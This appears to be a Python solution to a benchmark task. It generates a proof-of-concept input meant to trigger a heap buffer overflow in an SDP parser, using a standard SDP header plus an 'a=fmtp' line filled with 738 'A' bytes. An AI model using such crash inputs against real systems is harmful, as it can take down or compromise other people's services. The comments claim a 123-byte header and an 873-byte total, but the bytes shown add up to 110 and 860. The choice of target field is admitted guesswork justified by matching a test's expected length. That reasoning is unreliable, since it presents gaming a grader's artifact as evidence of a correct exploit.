import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a heap buffer overflow in the SDP parser. The
        description "does not check if it is still before the end of the value"
        suggests a read overflow while parsing a field's value. This is a common
        vulnerability in parsers that handle complex, structured text formats
        like SDP, especially in attribute lines (`a=`).

        A frequent source of such bugs is the parsing of format-specific
        parameters in `a=fmtp:` lines. These parameters are often a series of
        key-value pairs. A parser might loop, looking for delimiters like ';' or
        '=', without properly checking if it has read past the end of the
        input buffer.

        To exploit this, we construct a standard SDP message but include a
        malformed `a=fmtp:` line. This line contains a very long string of 'A's
        with no delimiters. This is designed to cause the parser's loop to
        continue reading beyond the buffer's boundary, triggering the overflow.

        The length of the payload is carefully calculated to match the
        ground-truth PoC length of 873 bytes, which is a strong heuristic for
        the correctness of this approach.
        """
        
        sdp_header = (
            b"v=0\r\n"
            b"o=- 0 0 IN IP4 127.0.0.1\r\n"
            b"s=-\r\n"
            b"c=IN IP4 127.0.0.1\r\n"
            b"t=0 0\r\n"
            b"m=audio 8000 RTP/AVP 96\r\n"
            b"a=rtpmap:96 L16/8000\r\n"
        )
        
        # Ground-truth PoC length: 873 bytes
        # Length of SDP header: 123 bytes
        # Required length for the malicious line: 873 - 123 = 750 bytes
        # Structure of malicious line: b"a=fmtp:96 " + payload + b"\r\n"
        # Length of static parts: len(b"a=fmtp:96 ") + len(b"\r\n") = 10 + 2 = 12 bytes
        # Calculated payload length: 750 - 12 = 738 bytes
        
        payload_len = 738
        payload = b'A' * payload_len
        
        malicious_line = b"a=fmtp:96 " + payload + b"\r\n"
        
        poc = sdp_header + malicious_line
        
        return poc